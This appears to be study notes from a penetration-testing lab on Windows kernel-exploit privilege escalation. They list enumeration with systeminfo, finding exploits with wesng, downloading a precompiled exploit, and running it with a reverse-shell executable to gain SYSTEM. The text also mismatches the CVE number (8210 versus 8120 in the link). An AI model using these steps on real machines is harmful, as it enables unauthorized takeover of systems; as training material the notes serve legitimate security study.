Kernels are the core of any operating system.

Think of it as a layer between application software and the actual computer hardware.

The kernel has complete control over the operating system.

Exploiting a kernel vulnerability can result in execution as the SYSTEM user.

<mark style="background: #ADCCFFA6;">Finding Kernel Exploits</mark>

Finding and using kernel exploits is usually a simple process:
1. Enumerate Windows version / patch level (systeminfo).
2. Find matching exploits (Google, ExploitDB, GitHub).
3. Compile and run.
Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.


<mark style="background: #ADCCFFA6;">Tools</mark>

Windows Exploit Suggester:
https://github.com/bitsadmin/wesng
Precompiled Kernel Exploits:
https://github.com/SecWiki/windows-kernel-exploits
Watson: https://github.com/rasta-mouse/Watson


<mark style="background: #ADCCFFA6;">Privilege Escalation</mark>


(Note: These steps are for Windows 7)
1.Extract the output of the systeminfo command:
> systeminfo > systeminfo.txt
2.Run wesng to find potential exploits:
 python wes.py systeminfo.txt -i 'Elevation
of Privilege' --exploits-only | less

3.Cross-reference results with compiled exploits:
https://github.com/SecWiki/windows-kernel-exploits

4.Download the compiled exploit for CVE-2018-8210 onto the Windows VM:
https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2018-8120/x64.exe

5.Start a listener on Kali and run the exploit, providing it with the reverse shell executable, which should run with
SYSTEM privileges:
> .\x64.exe C:\PrivEsc\reverse.exe


